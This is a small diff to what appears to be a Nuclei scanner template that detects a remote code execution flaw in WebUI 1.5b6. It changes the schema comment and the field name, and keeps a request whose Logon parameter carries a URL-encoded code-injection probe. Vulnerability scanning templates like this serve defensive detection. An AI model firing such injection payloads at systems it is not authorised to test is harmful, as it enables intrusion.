@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: webui-rce
 info:
   name: WebUI 1.5b6 RCE
@@ -6,7 +7,7 @@ info:
   description: WebUI's 'mainfile.php' endpoint contain a vulnerability that allows remote attackers to cause it to execute arbitrary code via the 'Logon' parameter.
   reference: https://www.exploit-db.com/exploits/36821
   tags: webui,rce
-requests:
+http:
   - method: GET
     path:
       - '{{BaseURL}}/mainfile.php?username=test&password=testpoc&_login=1&Logon=%27%3Becho%20md5(TestPoc)%3B%27'
